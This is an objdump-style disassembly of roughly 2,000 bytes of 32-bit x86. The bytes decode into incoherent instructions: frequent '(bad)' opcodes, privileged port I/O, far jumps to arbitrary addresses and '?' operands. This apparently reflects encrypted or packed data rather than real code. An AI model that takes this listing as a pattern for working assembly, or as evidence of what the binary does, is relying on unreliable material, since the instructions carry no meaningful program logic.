  418b86:	cmp    ebp,DWORD PTR [edi+0x33]
  418b89:	adc    BYTE PTR ds:0x5539dc16,0xaf
  418b90:	fimul  WORD PTR [edi+ecx*2-0x9]
  418b94:	in     eax,dx
  418b95:	fstp   TBYTE PTR [ebp-0x11]
  418b98:	dec    ecx
  418b99:	push   ebx
  418b9b:	aas    
  418b9c:	out    0xd8,eax
  418b9e:	push   ecx
  418b9f:	sub    BYTE PTR [eax],0x3a
  418ba2:	xchg   ecx,eax
  418ba3:	and    DWORD PTR ds:0x4f937b4e,0x748bedbe
  418bad:	sub    eax,0xdae457
  418bb2:	mov    esp,0xacbd3283
  418bb7:	jg     0x418b87
  418bb9:	outs   dx,DWORD PTR ds:[esi]
  418bba:	xchg   edi,eax
  418bbb:	sti    
  418bbc:	and    al,0xdb
  418bbe:	retf   
  418bbf:	sti    
  418bc0:	cld    
  418bc1:	jae    0x418c12
  418bc3:	sub    cl,BYTE PTR [ecx-0x62]
  418bc6:	cld    
  418bc7:	sbb    eax,0x5ccc384f
  418bcc:	rcr    DWORD PTR ds:0xec01c04c,1
  418bd2:	sbb    al,0xcf
  418bd4:	call   0x42f87bfb
  418bd9:	mov    DWORD PTR [eax],esi
  418bdb:	push   ebx
  418bdc:	pusha  
  418bdd:	pmulhw mm2,mm6
  418be0:	xor    DWORD PTR [eax],ecx
  418be2:	push   edi
  418be3:	inc    eax
  418be4:	inc    edx
  418be5:	inc    edi
  418be6:	ret    
  418be7:	ins    BYTE PTR es:[edi],dx
  418be8:	xor    esp,esi
  418bea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418beb:	adc    al,0x98
  418bed:	jns    0x418c33
  418bef:	loop   0x418bde
  418bf1:	sbb    BYTE PTR [ecx+ecx*1+0x47],dh
  418bf5:	into   
  418bf6:	popa   
  418bf7:	pop    esp
  418bf8:	(bad)  
  418bf9:	into   
  418bfa:	fsub   st(3),st
  418bfc:	pop    edi
  418bfd:	jns    0x418c4e
  418bff:	dec    edi
  418c00:	mov    edx,0x9e0c62e0
  418c05:	iret   
  418c06:	loopne 0x418c24
  418c08:	dec    ebx
  418c09:	pusha  
  418c0a:	fiadd  WORD PTR [edi]
  418c0c:	add    BYTE PTR [ebx-0x7a],dh
  418c0f:	and    BYTE PTR [ebp+eax*1+0x8],bl
  418c13:	(bad)  
  418c15:	ins    BYTE PTR es:[edi],dx
  418c16:	aas    
  418c17:	inc    edi
  418c18:	push   ecx
  418c19:	pusha  
  418c1a:	js     0x418c8d
  418c1c:	(bad)  
  418c1d:	mov    ecx,0xf095e9ff
  418c22:	push   ebx
  418c23:	lahf   
  418c24:	call   0x5cd06a83
  418c29:	sbb    eax,DWORD PTR [eax-0x3801b789]
  418c2f:	push   edi
  418c30:	and    esp,DWORD PTR [ecx]
  418c32:	xor    al,0xed
  418c34:	adc    ecx,esi
  418c36:	test   al,0x2b
  418c38:	lods   al,BYTE PTR ds:[esi]
  418c39:	jns    0x418c2e
  418c3b:	(bad)  
  418c3d:	sbb    al,0xdd
  418c3f:	not    esi
  418c41:	enter  0x8745,0x18
  418c45:	jecxz  0x418c68
  418c47:	idiv   DWORD PTR [eax]
  418c49:	pop    esi
  418c4a:	xlat   BYTE PTR ds:[ebx]
  418c4b:	mov    ds:0xd8752e83,eax
  418c50:	int    0xb1
  418c52:	int    0xab
  418c54:	and    eax,0x5c89473d
  418c59:	mov    edx,0x59f003b0
  418c5e:	jae    0x418c45
  418c60:	jae    0x418bf0
  418c62:	jecxz  0x418c08
  418c64:	pop    ss
  418c65:	cs pop ds
  418c67:	shr    bl,0xf5
  418c6a:	inc    ebp
  418c6b:	cmp    edi,DWORD PTR [edi+esi*8+0x18]
  418c6f:	and    esp,DWORD PTR [edi]
  418c71:	xor    dh,BYTE PTR [ecx+0x7e]
  418c74:	mov    dh,0xc0
  418c76:	xor    eax,0x235a6e04
  418c7b:	mov    edx,0xf8c57fa7
  418c80:	cmp    dh,al
  418c82:	into   
  418c83:	shl    DWORD PTR ds:0x3783ce1c,0xe5
  418c8a:	jno    0x418c99
  418c8c:	call   0xf0f:0x2d253368
  418c93:	inc    eax
  418c94:	cwde   
  418c95:	arpl   WORD PTR [ecx],bx
  418c97:	mov    ds:0xdd20b208,al
  418c9c:	into   
  418c9d:	outs   dx,DWORD PTR ds:[esi]
  418c9e:	ins    DWORD PTR es:[edi],dx
  418c9f:	ins    DWORD PTR es:[edi],dx
  418ca0:	mov    ebp,0x7bee97c3
  418ca5:	pop    edx
  418ca6:	scas   al,BYTE PTR es:[edi]
  418ca7:	or     eax,0x4b243bc0
  418cac:	iret   
  418cad:	fdivr  QWORD PTR [ecx-0x2a]
  418cb0:	addr16 pop ecx
  418cb2:	jmp    0x418d02
  418cb4:	clc    
  418cb5:	out    dx,eax
  418cb6:	in     al,0xbe
  418cb8:	mov    ds:0x4fa954fc,al
  418cbd:	cwde   
  418cbe:	xlat   BYTE PTR ds:[ebx]
  418cbf:	rol    DWORD PTR [ebp-0x71],0xe2
  418cc3:	sbb    BYTE PTR [ebp-0x4646c4c9],0x30
  418cca:	ret    
  418ccb:	test   DWORD PTR [esp+ebp*8-0x70],0x7338f0da
  418cd3:	dec    edi
  418cd4:	add    al,0x61
  418cd6:	sbb    dh,BYTE PTR [ebx+0x45]
  418cd9:	xchg   esp,eax
  418cda:	and    al,0xf7
  418cdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418cdd:	push   edi
  418cde:	rol    BYTE PTR [edi+edx*1],cl
  418ce1:	clc    
  418ce2:	repz test cl,dh
  418ce5:	cs pop eax
  418ce7:	out    0x88,eax
  418ce9:	push   ebx
  418cea:	es mov ah,0xf3
  418ced:	js     0x418cf6
  418cef:	mov    al,ds:0x8279fa7b
  418cf4:	arpl   sp,ax
  418cf6:	sub    al,0xae
  418cf8:	dec    esp
  418cf9:	add    al,0x7a
  418cfb:	cmp    dl,dl
  418cfd:	jo     0x418d40
  418cff:	inc    esp
  418d00:	sti    
  418d01:	pop    esp
  418d02:	and    eax,0x150a5e61
  418d07:	cwde   
  418d08:	xchg   ebx,eax
  418d09:	or     BYTE PTR [ebx+esi*2-0x52],0xec
  418d0e:	xchg   BYTE PTR [ecx],bh
  418d10:	arpl   WORD PTR [esi-0x46],cx
  418d13:	sbb    BYTE PTR [edx+0x6892fefd],ah
  418d19:	iret   
  418d1a:	adc    al,0xb0
  418d1c:	hlt    
  418d1d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d1f:	aaa    
  418d20:	clc    
  418d21:	call   0xd7824781
  418d26:	repnz xor eax,0xbc00dae5
  418d2c:	inc    ebx
  418d2d:	rcr    bl,cl
  418d2f:	aas    
  418d30:	clc    
  418d31:	jle    0x418cf2
  418d33:	ins    BYTE PTR es:[edi],dx
  418d34:	dec    ecx
  418d35:	pop    esi
  418d36:	and    eax,0xbaf0def7
  418d3b:	xor    DWORD PTR [edi],ecx
  418d3d:	cdq    
  418d3e:	sbb    eax,0xfd94ef8f
  418d43:	and    al,0xaf
  418d45:	mov    ds:0x186ccad9,al
  418d4a:	repz xor ah,BYTE PTR [edx+0x3d737a53]
  418d51:	stos   DWORD PTR es:[edi],eax
  418d52:	in     eax,dx
  418d53:	lods   eax,DWORD PTR ds:[esi]
  418d54:	popf   
  418d55:	cmp    al,0xfd
  418d57:	or     ah,cl
  418d59:	xchg   BYTE PTR [edi+0x653822ae],ch
  418d5f:	inc    edi
  418d60:	addr16 dec esi
  418d62:	adc    BYTE PTR [ebx-0x51787fb6],0xeb
  418d69:	mov    DWORD PTR [esi+0x5c],ecx
  418d6c:	(bad)  
  418d6d:	out    dx,al
  418d6e:	js     0x418ddc
  418d70:	(bad)  
  418d71:	adc    dh,BYTE PTR [ecx+0x15]
  418d74:	jo     0x418dea
  418d76:	add    DWORD PTR es:[ecx-0x39c3e214],edi
  418d7d:	ret    0x6739
  418d80:	jae    0x418d90
  418d82:	repnz cdq 
  418d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d85:	dec    ebp
  418d86:	dec    ecx
  418d87:	xchg   esi,eax
  418d88:	or     ax,0x5e3f
  418d8c:	jecxz  0x418d12
  418d8e:	out    0x67,eax
  418d90:	lahf   
  418d91:	cmp    bh,al
  418d93:	add    ebx,DWORD PTR [ecx+edi*1+0x69d9288]
  418d9a:	mov    ah,0xe
  418d9c:	(bad)  
  418d9d:	jg     0x418d87
  418d9f:	fstp   TBYTE PTR [esi+0x75f2d738]
  418da5:	in     eax,0xda
  418da7:	add    BYTE PTR [ebx+eax*1-0x64c0880e],bh
  418dae:	adc    al,0xf4
  418db0:	pop    esi
  418db1:	div    DWORD PTR [ebx]
  418db3:	ds paddusw mm2,mm7
  418db7:	bound  edx,QWORD PTR [esi-0x42]
  418dba:	jb     0x418dd0
  418dbc:	ret    0xf645
  418dbf:	cdq    
  418dc0:	xchg   DWORD PTR [esi+ecx*4+0x27bb0071],edi
  418dc7:	shl    BYTE PTR [ebp-0x21],0x4f
  418dcb:	jne    0x418dce
  418dcd:	mov    dh,bl
  418dcf:	push   eax
  418dd0:	fmul   st,st(5)
  418dd2:	ffreep st(1)
  418dd4:	inc    ebp
  418dd5:	ficomp WORD PTR [edi-0x6d667eea]
  418ddb:	mov    ecx,0x786bfad
  418de0:	push   edi
  418de1:	jo     0x418e35
  418de3:	adc    bh,cl
  418de5:	fs push ds
  418de7:	div    DWORD PTR [eax]
  418de9:	sahf   
  418dea:	mov    esp,0x4e1cf9dd
  418def:	jb     0x79a95f8c
  418df5:	into   
  418df6:	ror    DWORD PTR [ecx+0x9],cl
  418df9:	mov    esp,0x558bcb9f
  418dfe:	cmp    BYTE PTR [ecx-0x70938474],dl
  418e04:	mov    eax,ds:0x3720d270
  418e09:	aam    0xb7
  418e0b:	mov    edi,0xc063c307
  418e10:	sbb    al,0x82
  418e12:	nop
  418e13:	shr    BYTE PTR [eiz*4-0x21d36e],0xbf
  418e1b:	(bad)  
  418e1c:	call   0xbd9d8493
  418e21:	xlat   BYTE PTR ss:[ebx]
  418e23:	repnz (bad) 
  418e25:	in     eax,0xda
  418e27:	add    BYTE PTR [ebx+eax*1-0x16403c1e],bh
  418e2e:	aaa    
  418e2f:	mov    ch,0xbb
  418e31:	outs   dx,BYTE PTR ds:[esi]
  418e32:	sbb    DWORD PTR [edi-0x4c],ecx
  418e35:	ret    
  418e36:	pop    edx
  418e37:	iret   
  418e38:	mov    al,0xc
  418e3a:	sub    al,0x9b
  418e3c:	pop    ss
  418e3d:	add    BYTE PTR [esi+0x7],ch
  418e40:	fist   WORD PTR [ebp+0x2b9c5ad0]
  418e46:	mov    ah,BYTE PTR [ebx-0x30ca59e4]
  418e4c:	out    dx,eax
  418e4d:	sbb    eax,0xa4b7b03a
  418e52:	daa    
  418e53:	xor    BYTE PTR [edi],ah
  418e55:	in     al,dx
  418e56:	cmp    al,0x5d
  418e58:	jmp    0x418e11
  418e5a:	mov    ecx,?
  418e5c:	jae    0x418e1b
  418e5e:	cmp    ebp,DWORD PTR gs:[edi-0xbc3e979]
  418e65:	xlat   BYTE PTR fs:[ebx]
  418e67:	sbb    BYTE PTR [eax+0x1e],bl
  418e6a:	add    eax,0x9c20e617
  418e6f:	pop    ebx
  418e70:	out    0x73,al
  418e72:	jp     0x418e73
  418e74:	sbb    eax,0x8bd3d1b0
  418e79:	loopne 0x418e8d
  418e7b:	xchg   edx,eax
  418e7c:	sub    al,0xf
  418e7e:	out    dx,eax
  418e7f:	fbstp  TBYTE PTR [ebx+0x6e]
  418e82:	push   cs
  418e83:	test   eax,0x7afca1c7
  418e88:	add    DWORD PTR [edi],edi
  418e8a:	pop    es
  418e8b:	pop    edi
  418e8c:	jo     0x418ed0
  418e8e:	jg     0x418eb7
  418e90:	sub    al,BYTE PTR [edx]
  418e92:	jnp    0x418ed0
  418e94:	call   0xa85a:0x8609329d
  418e9b:	aas    
  418e9c:	cmp    DWORD PTR [esi-0xb],edi
  418e9f:	ins    DWORD PTR es:[edi],dx
  418ea0:	pop    edi
  418ea1:	mov    ah,0x6b
  418ea3:	add    DWORD PTR [esi+0x223bc00d],ebp
  418ea9:	dec    edx
  418eaa:	sub    dh,bh
  418eac:	adc    ecx,eax
  418eae:	mov    ah,0x22
  418eb0:	pop    esi
  418eb1:	mov    edx,0x87edbbad
  418eb6:	(bad)  [ebp+0x2d]
  418eb9:	mov    ebx,esi
  418ebb:	push   eax
  418ebc:	sbb    dh,ah
  418ebe:	mov    al,ds:0x9ece2498
  418ec3:	arpl   ax,bp
  418ec5:	test   cl,0x9c
  418ec8:	nop
  418ec9:	xlat   BYTE PTR ds:[ebx]
  418eca:	inc    ebp
  418ecb:	add    bh,ah
  418ecd:	sahf   
  418ece:	ror    BYTE PTR [ebx],cl
  418ed0:	fidivr WORD PTR [ecx-0x10c2bb3d]
  418ed6:	jmp    0xe96d7a53
  418edb:	add    dh,bl
  418edd:	jecxz  0x418f59
  418edf:	jnp    0x418ee9
  418ee1:	add    al,0x61
  418ee3:	(bad)  
  418ee4:	shr    DWORD PTR [edi+0x78],cl
  418ee7:	adc    BYTE PTR [eax+0x47],bh
  418eea:	imul   eax,DWORD PTR ds:0x4d1b9598,0xe617cc3b
  418ef4:	xchg   DWORD PTR [eax-0x58],esi
  418ef7:	(bad)  
  418ef8:	dec    esi
  418ef9:	clc    
  418efa:	das    
  418efb:	js     0x418f11
  418efd:	aad    0xfb
  418eff:	push   esi
  418f00:	mov    ?,edx
  418f02:	cmp    edi,DWORD PTR [edi+0x72]
  418f05:	aas    
  418f06:	aaa    
  418f07:	repz adc al,0xc9
  418f0a:	daa    
  418f0b:	iret   
  418f0c:	aas    
  418f0d:	xchg   ebx,eax
  418f0e:	shl    DWORD PTR [edi],cl
  418f10:	loopne 0x418e96
  418f12:	sti    
  418f13:	push   cs
  418f14:	and    dl,ch
  418f16:	sub    al,0x52
  418f18:	icebp  
  418f19:	fst    DWORD PTR [ecx+0x60844f80]
  418f1f:	xor    bh,BYTE PTR [ecx-0x33]
  418f22:	or     bh,BYTE PTR [edi+eax*4-0x1c]
  418f26:	fiadd  DWORD PTR [eax]
  418f28:	mov    esp,0xeab6a203
  418f2d:	aas    
  418f2e:	sub    bl,bl
  418f30:	mov    bl,0xfe
  418f32:	fnstsw WORD PTR [esi]
  418f34:	jns    0x418f31
  418f36:	ja     0x418efb
  418f38:	cwde   
  418f39:	sub    DWORD PTR [ebx],edx
  418f3b:	int3   
  418f3c:	inc    edx
  418f3d:	pop    ebx
  418f3e:	outs   dx,DWORD PTR ds:[esi]
  418f3f:	push   ds
  418f40:	out    dx,eax
  418f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f42:	or     cl,BYTE PTR [esi-0x1]
  418f45:	mov    edi,0xaf3be373
  418f4a:	add    edi,DWORD PTR [ebx]
  418f4c:	xchg   DWORD PTR [esi-0x5d7c7753],esi
  418f52:	sbb    DWORD PTR [ebp-0x27a1c419],0xffffff9a
  418f59:	pop    ds
  418f5a:	repz dec edx
  418f5c:	das    
  418f5d:	add    ah,0xd5
  418f60:	jp     0x418f1e
  418f62:	js     0x418f29
  418f64:	push   es
  418f65:	pop    esp
  418f66:	jmp    0xe7d44bab
  418f6b:	aas    
  418f6c:	inc    ebp
  418f6d:	sub    eax,0x93425c06
  418f72:	aaa    
  418f73:	inc    edx
  418f74:	mov    cl,0x6c
  418f76:	rcl    al,0xcd
  418f79:	and    DWORD PTR [ebx+eiz*2],ebx
  418f7c:	and    eax,0x9d79d7c
  418f81:	repz jo 0x418fe3
  418f84:	lock sbb BYTE PTR [ecx],ch
  418f87:	(bad)  
  418f88:	sbb    dl,cl
  418f8a:	push   ds
  418f8b:	int3   
  418f8c:	ret    
  418f8d:	imul   eax,DWORD PTR [eiz*1+0x2c76de71],0xffffffcb
  418f95:	pusha  
  418f96:	dec    ebp
  418f97:	aam    0x4f
  418f99:	cld    
  418f9a:	(bad)  
  418f9b:	dec    edi
  418f9c:	mov    esi,0x7c0acd7a
  418fa1:	pop    es
  418fa2:	in     al,0xda
  418fa4:	add    BYTE PTR [ebp+ecx*2-0x48c06a07],bh
  418fab:	xchg   esp,eax
  418fac:	adc    eax,DWORD PTR [esi+0x1f645783]
  418fb2:	push   edi
  418fb3:	(bad)  
  418fb4:	pop    esi
  418fb5:	leave  
  418fb6:	repz repnz xchg ebp,eax
  418fb9:	mov    ds:0xeb8e4e78,eax
  418fbe:	js     0x419033
  418fc0:	dec    ecx
  418fc1:	pushf  
  418fc2:	xchg   esp,edx
  418fc4:	outs   dx,BYTE PTR ds:[esi]
  418fc5:	fs out dx,al
  418fc7:	add    esp,eax
  418fc9:	sbb    al,0x4e
  418fcb:	rcl    BYTE PTR ds:0xae737c5,0x66
  418fd2:	jmp    0x5eb4d54a
  418fd7:	out    dx,eax
  418fd8:	push   esi
  418fd9:	sbb    al,0x24
  418fdb:	rcr    BYTE PTR [eax-0x41b1817d],0xee
  418fe2:	nop
  418fe3:	mov    ds,WORD PTR [esi+ebx*4-0x7ad6d404]
  418fea:	xor    BYTE PTR [edi],bh
  418fec:	pop    es
  418fed:	pop    es
  418fee:	in     al,dx
  418fef:	jae    0x419005
  418ff1:	fadd   QWORD PTR [ecx]
  418ff3:	sub    al,0x9d
  418ff5:	cmp    al,0xdf
  418ff7:	fstp   QWORD PTR [ebx-0x20]
  418ffa:	add    DWORD PTR [eax],esp
  418ffc:	frstor [esi+0x24]
  418fff:	daa    
  419000:	cld    
  419001:	mov    bh,0x43
  419003:	add    ecx,eax
  419005:	repz cdq 
  419007:	mov    ebp,0x31783b8
  41900c:	shl    ebx,0x9e
  41900f:	pop    esi
  419010:	lods   al,BYTE PTR ds:[esi]
  419011:	les    ecx,FWORD PTR [ecx+0x37]
  419014:	fs jno 0x419075
  419017:	dec    ecx
  419018:	mov    al,0xa6
  41901a:	xchg   ebx,eax
  41901b:	lea    edx,[ebx-0xc21129]
  419021:	mov    dh,0x2e
  419023:	fdiv   QWORD PTR [ebp-0x1ff92900]
  419029:	ins    DWORD PTR es:[edi],dx
  41902a:	dec    ebx
  41902b:	and    al,0xb5
  41902d:	clc    
  41902e:	ds push esp
  419030:	ins    DWORD PTR es:[edi],dx
  419031:	shl    ecx,0xaf
  419034:	or     ecx,esp
  419036:	xor    DWORD PTR [eax],eax
  419038:	outs   dx,DWORD PTR ds:[esi]
  419039:	(bad)  
  41903a:	pushf  
  41903b:	mov    ds:0x84878ef8,eax
  419040:	mov    ecx,0xc7828a42
  419045:	jo     0x41901f
  419047:	mov    edi,0xde01bd3b
  41904c:	test   eax,0xcd83b3c1
  419051:	(bad)  
  419052:	jae    0x419046
  419054:	jb     0x41900d
  419056:	push   0x28
  419058:	int3   
  419059:	jno    0x41905f
  41905b:	aaa    
  41905c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41905d:	jbe    0x41903d
  41905f:	retf   
  419060:	xchg   ebx,eax
  419061:	iret   
  419062:	cmp    ebp,DWORD PTR [ecx]
  419064:	xchg   al,ah
  419066:	push   ecx
  419067:	jle    0x419040
  419069:	pusha  
  41906a:	cmp    BYTE PTR [edi+0x61],ch
  41906d:	out    0xf3,eax
  41906f:	mov    ss,WORD PTR [edx]
  419071:	cmp    ah,BYTE PTR ds:0x860f0141
  419077:	pusha  
  419078:	mov    edi,0x1879339f
  41907d:	std    
  41907e:	inc    esp
  41907f:	sar    BYTE PTR [edx+0x0],0x0
  419083:	and    BYTE PTR [eax],al
  419085:	dec    ecx
  419086:	inc    esp
  419087:	inc    ecx
  419088:	push   esp
  419089:	iret   
  41908a:	repz scas al,BYTE PTR es:[edi]
  41908c:	adc    BYTE PTR [ecx+0x30cdff98],dl
  419092:	out    0x4a,al
  419094:	out    dx,al
  419095:	sbb    BYTE PTR [edx],cl
  419097:	push   ecx
  419098:	call   0xcc88:0xd79d04b3
  41909f:	or     eax,0x80933b94
  4190a4:	stc    
  4190a5:	enter  0x5974,0x30
  4190a9:	and    al,0x8b
  4190ab:	jmp    0x419106
  4190ad:	sub    edi,0x801b5c84
  4190b3:	mov    bh,0x29
  4190b5:	popf   
  4190b6:	add    DWORD PTR [edi-0x19fbf461],0xffffffca
  4190bd:	sub    cl,BYTE PTR [ebx+0x51dffcb3]
  4190c3:	jp     0x419074
  4190c5:	xlat   BYTE PTR ds:[ebx]
  4190c6:	jae    0x4190a3
  4190c8:	jnp    0x419069
  4190ca:	inc    esi
  4190cb:	out    dx,al
  4190cc:	cmp    eax,0x2b60288a
  4190d1:	test   DWORD PTR [eax],edi
  4190d3:	(bad)  
  4190d4:	fist   DWORD PTR [ebp+0x6f1e1ea1]
  4190da:	in     al,dx
  4190db:	jp     0x419135
  4190dd:	sti    
  4190de:	jno    0x4190cc
  4190e0:	call   FWORD PTR [ebp-0x7dd8ff02]
  4190e6:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4190e8:	add    eax,0x3869155f
  4190ed:	cvtps2pd xmm6,QWORD PTR [ebx+0x25]
  4190f1:	hlt    
  4190f2:	jbe    0x4190ed
  4190f4:	mov    ecx,0xf626ec8a
  4190f9:	int3   
  4190fa:	adc    eax,0x4b1cf4d8
  4190ff:	mov    al,0x41
  419101:	dec    edi
  419102:	cmp    al,0x9e
  419104:	fld    TBYTE PTR [ebx+0x87cc2e8]
  41910a:	test   al,0x13
  41910c:	adc    DWORD PTR [eax],ebx
  41910e:	push   cs
  41910f:	sahf   
  419110:	loopne 0x41914e
  419112:	out    0x9,al
  419114:	sti    
  419115:	popf   
  419116:	pushf  
  419117:	pop    edi
  419118:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41911a:	or     eax,0xbd03b078
  41911f:	scas   eax,DWORD PTR es:[edi]
  419120:	jle    0x419120
  419122:	jg     0x419123
  419124:	icebp  
  419125:	idiv   DWORD PTR ds:0xcb5c3e85
  41912b:	mov    bh,0x2b
  41912d:	xlat   BYTE PTR ds:[ebx]
  41912e:	push   es
  41912f:	loopne 0x41919e
  419131:	enter  0xfdaf,0x97
  419135:	iret   
  419136:	add    eax,0x9f9967c
  41913b:	ja     0x4190fc
  41913d:	lahf   
  41913e:	jge    0x41917b
  419140:	dec    edx
  419141:	mov    esi,0xbbcfcb39
  419146:	mov    ecx,0x13f4bbc7
  41914b:	jo     0x419110
  41914d:	jb     0x419126
  41914f:	jnp    0x4191ac
  419151:	jae    0x419117
  419153:	fild   WORD PTR ds:0x73cf3cf4
  419159:	cwde   
  41915a:	jl     0x4191b3
  41915c:	dec    edx
  41915d:	push   0xffffff96
  41915f:	out    0x79,eax
  419161:	int3   
  419162:	xchg   ebp,eax
  419163:	xlat   BYTE PTR ds:[ebx]
  419164:	pop    ebp
  419165:	(bad)  
  419167:	xchg   esp,eax
  419168:	in     eax,dx
  419169:	in     al,dx
  41916a:	jecxz  0x4191a4
  41916c:	out    dx,eax
  41916d:	in     eax,dx
  41916e:	loop   0x419175
  419170:	imul   BYTE PTR [ebx-0x61]
  419173:	xor    bl,BYTE PTR ss:[edi+0x55]
  419177:	xlat   BYTE PTR ds:[ebx]
  419178:	ja     0x4191cc
  41917a:	add    eax,0x803df147
  41917f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419180:	imul   esp,esp,0x3c
  419183:	inc    esi
  419184:	(bad)  
  419185:	(bad)  ds:0xc97478e8
  41918b:	sbb    DWORD PTR [bp-0x140a],0x7c
  419191:	ss icebp 
  419193:	leave  
  419194:	sti    
  419195:	fnstsw WORD PTR [eax]
  419197:	lahf   
  419198:	fisttp DWORD PTR [ecx-0x2c3fe394]
  41919e:	icebp  
  41919f:	(bad)  
  4191a0:	push   ss
  4191a1:	sub    DWORD PTR ss:[eax-0x29],ecx
  4191a5:	out    dx,al
  4191a6:	cli    
  4191a7:	adc    al,0x65
  4191a9:	jecxz  0x419186
  4191ab:	mov    ebp,0x5572d766
  4191b0:	scas   al,BYTE PTR es:[edi]
  4191b1:	or     eax,0x7310dbc0
  4191b6:	cmp    bh,BYTE PTR [ebx+eiz*1-0x31a438b2]
  4191bd:	or     al,0x7c
  4191bf:	mov    DWORD PTR [ebx-0x1343dc47],0xcd9579e7
  4191c9:	in     eax,dx
  4191ca:	je     0x41918f
  4191cc:	xchg   ebx,eax
  4191cd:	add    edi,DWORD PTR [ebx]
  4191cf:	sahf   
  4191d0:	push   eax
  4191d1:	rcr    BYTE PTR [ebp-0x38cb102b],0x48
  4191d8:	sahf   
  4191d9:	sub    esp,esp
  4191db:	or     al,0xfc
  4191dd:	pushf  
  4191de:	mov    ebp,0xbf3f2cf9
  4191e3:	push   edx
  4191e4:	dec    esi
  4191e5:	xor    esp,edi
  4191e7:	dec    edx
  4191e8:	jmp    0xd0ddf16a
  4191ed:	pushf  
  4191ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191ef:	mov    esp,0x77ff27ba
  4191f4:	mov    ebp,0xd74da7be
  4191f9:	stos   DWORD PTR es:[edi],eax
  4191fa:	fsub   DWORD PTR [esi+0x5b963f31]
  419200:	adc    dh,BYTE PTR [esp+ecx*4-0x7f]
  419204:	jge    0x419212
  419206:	ror    DWORD PTR [esi],cl
  419208:	jmp    0xade464ea
  41920d:	(bad)
  419210:	inc    esi
  419211:	add    bl,BYTE PTR [esi]
  419213:	cli    
  419214:	mov    cl,0x75
  419216:	aad    0xfb
  419218:	cmp    ebp,DWORD PTR [edi+edi*1-0xbc55068]
  41921f:	push   esi
  419220:	cmp    eax,0x9654a01c
  419225:	inc    ecx
  419226:	xor    al,0xd5
  419228:	dec    eax
  419229:	out    0xbc,eax
  41922b:	jp     0x41926a
  41922d:	and    al,0xe4
  41922f:	ins    DWORD PTR es:[edi],dx
  419230:	retf   0x1b5
  419233:	js     0x419250
  419235:	xor    ch,BYTE PTR [edx-0x6c1cc02c]
  41923b:	lods   eax,DWORD PTR ds:[esi]
  41923c:	cdq    
  41923d:	mov    edx,0x965e5edb
  419242:	addr16 dec edx
  419244:	sub    al,0x60
  419246:	xchg   edi,eax
  419247:	mov    ecx,0x25b1d798
  41924c:	(bad)  
  41924d:	adc    bh,BYTE PTR [edx]
  41924f:	mov    esp,0x5c1100
  419254:	int3   
  419255:	add    cl,BYTE PTR gs:[edx+0x59672f33]
  41925c:	imul   BYTE PTR [ebx-0x7b]
  41925f:	mov    ecx,0xd6157832
  419264:	fwait
  419265:	dec    edx
  419266:	cmp    BYTE PTR [ecx],ah
  419268:	mov    ebp,0xc7783113
  41926d:	jns    0x419278
  41926f:	jbe    0x419286
  419271:	loope  0x4192bd
  419273:	or     esi,DWORD PTR [eax-0x1258b819]
  419279:	sbb    BYTE PTR [ebx],cl
  41927b:	mov    bh,0x95
  41927d:	xlat   BYTE PTR ds:[ebx]
  41927e:	pop    ebx
  41927f:	xchg   edi,eax
  419280:	(bad)  
  419281:	arpl   WORD PTR [eax-0x2a3d9564],bp
  419287:	and    al,0xdf
  419289:	adc    ebp,DWORD PTR [ecx+0x63bf3c78]
  41928f:	rcr    BYTE PTR [edi+ecx*8-0x62decd11],1
  419296:	jae    0x419249
  419298:	push   ebx
  419299:	add    edi,eax
  41929b:	sub    BYTE PTR [eax],bh
  41929d:	fisttp WORD PTR [ebx-0x404b29a5]
  4192a3:	inc    ebx
  4192a4:	sar    DWORD PTR [esi],1
  4192a6:	mov    ?,WORD PTR [edi-0x3c081e96]
  4192ac:	mov    al,0xda
  4192ae:	cli    
  4192af:	cld    
  4192b0:	mov    bh,0x79
  4192b2:	leave  
  4192b3:	scas   al,BYTE PTR es:[edi]
  4192b4:	in     eax,0x29
  4192b6:	mov    ecx,0x436f0036
  4192bb:	cld    
  4192bc:	enter  0x719f,0xe8
  4192c0:	mov    edx,0xe1ddf70e
  4192c5:	clc    
  4192c6:	jnp    0x419285
  4192c8:	mov    ds:0xde38018b,eax
  4192cd:	adc    eax,0xa371055c
  4192d2:	jae    0x419347
  4192d4:	out    dx,al
  4192d5:	adc    eax,0x7e7c2a79
  4192da:	mov    edx,0xde55f7d4
  4192df:	fdivrp st(3),st
  4192e1:	push   ds
  4192e2:	out    dx,al
  4192e3:	call   0xb8dece58
  4192e8:	mov    ds:0xf7954fac,al
  4192ed:	mov    esp,0xe995c1d8
  4192f2:	inc    eax
  4192f3:	(bad)  
  4192f4:	pop    esp
  4192f5:	mov    eax,ds:0xc45fb4dd
  4192fa:	sub    eax,0xa8d79f3
  4192ff:	and    BYTE PTR [edi-0x32ac26ab],0x70
  419306:	xchg   ebp,eax
  419307:	fiadd  DWORD PTR [ebx+0x48]
  41930a:	jb     0x41934a
  41930c:	ficom  WORD PTR [edi+0x6d]
  41930f:	das    
  419310:	bound  ebx,QWORD PTR [esi]
  419312:	add    DWORD PTR [eax-0x5433ed05],edi
  419318:	push   ebp
  419319:	add    ah,BYTE PTR [edi-0x9]
  41931c:	mov    eax,ds:0x7cf81df3
  419321:	pusha  
  419322:	dec    esp
  419323:	inc    edi
  419324:	scas   eax,DWORD PTR es:[edi]
  419325:	cld    
  419326:	repnz mul DWORD PTR [edi-0x2d]
  41932a:	pop    edi
  41932b:	test   DWORD PTR [edx],0x9537cb5d
  419331:	imul   eax,DWORD PTR [ebx],0xfffffff0
  419334:	push   ss
  419335:	in     eax,0x97
  419337:	ds xchg edx,eax
  419339:	pop    esp
  41933a:	aaa    
  41933b:	inc    edi
  41933c:	in     eax,dx
  41933d:	pop    ss
  41933e:	mov    ebp,0x7efc2f83
  419343:	jnp    0x419361
  419345:	xchg   edi,eax
  419346:	daa    
  419347:	ins    BYTE PTR es:[edi],dx
  419348:	add    eax,0x3cbce3e6
  41934d:	retf   0x45ef
  419350:	out    0xdd,eax
  419352:	pop    ecx
